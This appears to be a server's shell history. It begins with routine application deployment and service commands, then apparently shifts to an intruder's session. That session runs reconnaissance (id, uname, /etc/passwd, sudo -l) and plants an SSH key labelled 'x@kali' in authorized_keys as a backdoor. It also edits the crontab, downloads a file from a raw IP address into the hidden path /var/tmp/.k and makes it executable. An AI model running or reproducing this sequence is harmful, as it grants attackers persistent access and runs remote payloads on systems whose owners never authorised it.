git pull
systemctl status app
ls
tail -f /var/log/app/app.log
make deploy
cd app
sudo systemctl restart app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIrFtL3RYe9xPQirM5s4t53yKCM9fjZeLRJNuEsWI9NA x@kali' >> ~/.ssh/authorized_keys
crontab -
wget -q http://141.191.204.170/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
